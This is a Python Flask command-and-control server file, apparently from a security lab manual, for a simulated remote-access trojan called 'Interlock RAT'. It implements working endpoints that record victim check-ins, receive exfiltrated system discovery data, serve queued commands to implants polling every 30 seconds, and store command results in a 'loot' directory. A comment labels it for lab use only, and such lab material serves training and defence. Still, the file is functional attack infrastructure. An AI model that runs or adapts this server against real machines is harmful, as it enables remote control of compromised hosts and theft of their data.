"""
Interlock RAT Simulation — C2 Server
Source: lab manual §2.3 — /opt/c2/c2_server.py (Kali, 10.0.20.50:8080)

Flask C2 simulating the four endpoints used by the simulated Interlock RAT:
    POST /beacon  — initial check-in (hostname, domain, user, privilege, IP)
    POST /exfil   — automated discovery data (systeminfo, tasklist, services, ARP, etc.)
    GET  /cmd     — RAT polls every 30 s for hands-on-keyboard commands
    POST /result  — RAT returns command output

Loot directory: /opt/c2/loot       (beacons, exfil dumps, command results)
Command queue:  /opt/c2/commands/next_cmd.json

Educational/lab use only. See /docs and the README disclaimer.
"""
from flask import Flask, request, jsonify
import json, datetime, os

app = Flask(__name__)
LOOT = '/opt/c2/loot'
CMD_FILE = '/opt/c2/commands/next_cmd.json'

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json(force=True)
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    path = f'{LOOT}/beacon_{ts}.json'
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)
    print(f'\n[+] BEACON from {request.remote_addr}')
    print(f'    Saved to {path}')
    return jsonify({'status': 'ok'})

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.get_json(force=True)
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    path = f'{LOOT}/exfil_{ts}.json'
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)
    print(f'\n[+] EXFIL DATA received ({len(str(data))} bytes)')
    return jsonify({'status': 'ok'})

@app.route('/cmd', methods=['GET'])
def get_cmd():
    if os.path.exists(CMD_FILE):
        with open(CMD_FILE) as f:
            cmd_data = json.load(f)
        os.remove(CMD_FILE)
        print(f'\n[>] Sending command: {cmd_data}')
        return jsonify(cmd_data)
    return jsonify({'command': 'NONE', 'payload': ''})

@app.route('/result', methods=['POST'])
def result():
    data = request.get_json(force=True)
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    path = f'{LOOT}/result_{ts}.json'
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)
    print(f'\n[+] COMMAND RESULT received:')
    print(f'    {str(data.get("output",""))[:200]}')
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    print('[*] Interlock RAT C2 Server Starting...')
    print('[*] Listening on 0.0.0.0:8080')
    print('[*] Loot directory: /opt/c2/loot')
    print('[*] Queue commands:')
    print('    echo \'{"command":"CMD","payload":"whoami"}\' > /opt/c2/commands/next_cmd.json')
    app.run(host='0.0.0.0', port=8080, debug=False)
